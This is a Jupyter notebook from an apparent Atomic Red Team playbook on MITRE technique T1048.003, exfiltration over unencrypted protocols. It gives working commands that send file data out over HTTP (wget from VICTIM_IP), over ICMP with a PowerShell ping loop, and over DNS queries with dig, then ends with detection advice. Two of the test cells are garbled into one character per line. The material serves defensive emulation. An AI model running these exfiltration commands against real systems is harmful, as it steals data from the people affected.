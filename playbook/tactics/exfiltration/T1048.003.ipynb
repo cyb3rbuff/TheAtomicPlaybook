{
 "cells": [
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "# T1048.003 - Exfiltration Over Alternative Protocol: Exfiltration Over Unencrypted/Obfuscated Non-C2 Protocol",
    "\n",
    "Adversaries may steal data by exfiltrating it over an un-encrypted network protocol other than that of the existing command and control channel. The data may also be sent to an alternate network location from the main command and control server. \n\nAdversaries may opt to obfuscate this data, without the use of encryption, within network protocols that are natively unencrypted (such as HTTP, FTP, or DNS). This may include custom or publicly available encoding/compression algorithms (such as base64) as well as embedding data within protocol headers and fields. "
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## Atomic Tests"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "#Import the Module before running the tests.\nImport-Module /Users/0x6c/AtomicRedTeam/atomics/invoke-atomicredteam/Invoke-AtomicRedTeam.psd1 - Force"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### Atomic Test #1 - Exfiltration Over Alternative Protocol - HTTP\nA firewall rule (iptables or firewalld) will be needed to allow exfiltration on port 1337.\n\nUpon successful execution, sh will be used to make a directory (/tmp/victim-staging-area), write a txt file, and host the directory with Python on port 1337, to be later downloaded.\n\n**Supported Platforms:** macos, linux\nRun it with these steps!\n1\n.\n \nV\ni\nc\nt\ni\nm\n \nS\ny\ns\nt\ne\nm\n \nC\no\nn\nf\ni\ng\nu\nr\na\nt\ni\no\nn\n:\n\n\n\n\n \n \n \n \nm\nk\nd\ni\nr\n \n/\nt\nm\np\n/\nv\ni\nc\nt\ni\nm\n-\ns\nt\na\ng\ni\nn\ng\n-\na\nr\ne\na\n\n\n \n \n \n \ne\nc\nh\no\n \n\"\nt\nh\ni\ns\n \nf\ni\nl\ne\n \nw\ni\nl\nl\n \nb\ne\n \ne\nx\nf\ni\nl\nt\nr\na\nt\ne\nd\n\"\n \n>\n \n/\nt\nm\np\n/\nv\ni\nc\nt\ni\nm\n-\ns\nt\na\ng\ni\nn\ng\n-\na\nr\ne\na\n/\nv\ni\nc\nt\ni\nm\n-\nf\ni\nl\ne\n.\nt\nx\nt\n\n\n\n\n2\n.\n \nU\ns\ni\nn\ng\n \nP\ny\nt\nh\no\nn\n \nt\no\n \ne\ns\nt\na\nb\nl\ni\ns\nh\n \na\n \no\nn\ne\n-\nl\ni\nn\ne\n \nH\nT\nT\nP\n \ns\ne\nr\nv\ne\nr\n \no\nn\n \nv\ni\nc\nt\ni\nm\n \ns\ny\ns\nt\ne\nm\n:\n\n\n\n\n \n \n \n \nc\nd\n \n/\nt\nm\np\n/\nv\ni\nc\nt\ni\nm\n-\ns\nt\na\ng\ni\nn\ng\n-\na\nr\ne\na\n\n\n \n \n \n \np\ny\nt\nh\no\nn\n \n-\nm\n \nS\ni\nm\np\nl\ne\nH\nT\nT\nP\nS\ne\nr\nv\ne\nr\n \n1\n3\n3\n7\n\n\n\n\n3\n.\n \nT\no\n \nr\ne\nt\nr\ni\ne\nv\ne\n \nt\nh\ne\n \nd\na\nt\na\n \nf\nr\no\nm\n \na\nn\n \na\nd\nv\ne\nr\ns\na\nr\ny\n \ns\ny\ns\nt\ne\nm\n:\n\n\n\n\n \n \n \n \nw\ng\ne\nt\n \nh\nt\nt\np\n:\n/\n/\nV\nI\nC\nT\nI\nM\n_\nI\nP\n:\n1\n3\n3\n7\n/\nv\ni\nc\nt\ni\nm\n-\nf\ni\nl\ne\n.\nt\nx\nt\n\n"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### Atomic Test #2 - Exfiltration Over Alternative Protocol - ICMP\nExfiltration of specified file over ICMP protocol.\n\nUpon successful execution, powershell will utilize ping (icmp) to exfiltrate notepad.exe to a remote address (default 127.0.0.1). Results will be via stdout.\n\n**Supported Platforms:** windows\n#### Attack Commands: Run with `powershell`\n```powershell\n$ping = New-Object System.Net.Networkinformation.ping; foreach($Data in Get-Content -Path #{input_file} -Encoding Byte -ReadCount 1024) { $ping.Send(\"#{ip_address}\", 1500, $Data) }\n```"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "Invoke-AtomicTest T1048.003 -TestNumbers 2"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### Atomic Test #3 - Exfiltration Over Alternative Protocol - DNS\nExfiltration of specified file over DNS protocol.\n\n**Supported Platforms:** linux\nRun it with these steps!\n1\n.\n \nO\nn\n \nt\nh\ne\n \na\nd\nv\ne\nr\ns\na\nr\ny\n \nm\na\nc\nh\ni\nn\ne\n \nr\nu\nn\n \nt\nh\ne\n \nb\ne\nl\no\nw\n \nc\no\nm\nm\na\nn\nd\n.\n\n\n\n\n \n \n \n \nt\ns\nh\na\nr\nk\n \n-\nf\n \n\"\nu\nd\np\n \np\no\nr\nt\n \n5\n3\n\"\n \n-\nY\n \n\"\nd\nn\ns\n.\nq\nr\ny\n.\nt\ny\np\ne\n \n=\n=\n \n1\n \na\nn\nd\n \nd\nn\ns\n.\nf\nl\na\ng\ns\n.\nr\ne\ns\np\no\nn\ns\ne\n \n=\n=\n \n0\n \na\nn\nd\n \nd\nn\ns\n.\nq\nr\ny\n.\nn\na\nm\ne\n \nm\na\nt\nc\nh\ne\ns\n \n\"\n.\nd\no\nm\na\ni\nn\n\"\n\"\n \n>\n>\n \nr\ne\nc\ne\ni\nv\ne\nd\n_\nd\na\nt\na\n.\nt\nx\nt\n\n\n\n\n2\n.\n \nO\nn\n \nt\nh\ne\n \nv\ni\nc\nt\ni\nm\n \nm\na\nc\nh\ni\nn\ne\n \nr\nu\nn\n \nt\nh\ne\n \nb\ne\nl\no\nw\n \nc\no\nm\nm\na\nn\nd\ns\n.\n\n\n\n\n \n \n \n \nx\nx\nd\n \n-\np\n \ni\nn\np\nu\nt\n_\nf\ni\nl\ne\n \n>\n \ne\nn\nc\no\nd\ne\nd\n_\nd\na\nt\na\n.\nh\ne\nx\n \n|\n \nf\no\nr\n \nd\na\nt\na\n \ni\nn\n \n`\nc\na\nt\n \ne\nn\nc\no\nd\ne\nd\n_\nd\na\nt\na\n.\nh\ne\nx\n`\n;\n \nd\no\n \nd\ni\ng\n \n$\nd\na\nt\na\n.\nd\no\nm\na\ni\nn\n;\n \nd\no\nn\ne\n\n\n \n \n \n \n\n\n3\n.\n \nO\nn\nc\ne\n \nt\nh\ne\n \nd\na\nt\na\n \ni\ns\n \nr\ne\nc\ne\ni\nv\ne\nd\n,\n \nu\ns\ne\n \nt\nh\ne\n \nb\ne\nl\no\nw\n \nc\no\nm\nm\na\nn\nd\n \nt\no\n \nr\ne\nc\no\nv\ne\nr\n \nt\nh\ne\n \nd\na\nt\na\n.\n\n\n\n\n \n \n \n \nc\na\nt\n \no\nu\nt\np\nu\nt\n_\nf\ni\nl\ne\n \n|\n \nc\nu\nt\n \n-\nd\n \n\"\nA\n\"\n \n-\nf\n \n2\n \n|\n \nc\nu\nt\n \n-\nd\n \n\"\n \n\"\n \n-\nf\n \n2\n \n|\n \nc\nu\nt\n \n-\nd\n \n\"\n.\n\"\n \n-\nf\n \n1\n \n|\n \ns\no\nr\nt\n \n|\n \nu\nn\ni\nq\n \n|\n \nx\nx\nd\n \n-\np\n \n-\nr\n\n"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## Detection",
    "\n",
    "Analyze network data for uncommon data flows (e.g., a client sending significantly more data than it receives from a server). Processes utilizing the network that do not normally have network communication or have never been seen before are suspicious. Analyze packet contents to detect communications that do not follow the expected protocol behavior for the port that is being used. (Citation: University of Birmingham C2) "
   ]
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": ".NET (PowerShell)",
   "language": "PowerShell",
   "name": ".net-powershell"
  },
  "language_info": {
   "file_extension": ".ps1",
   "mimetype": "text/x-powershell",
   "name": "PowerShell",
   "pygments_lexer": "powershell",
   "version": "7.0"
  }
 },
 "nbformat": 4,
 "nbformat_minor": 4
}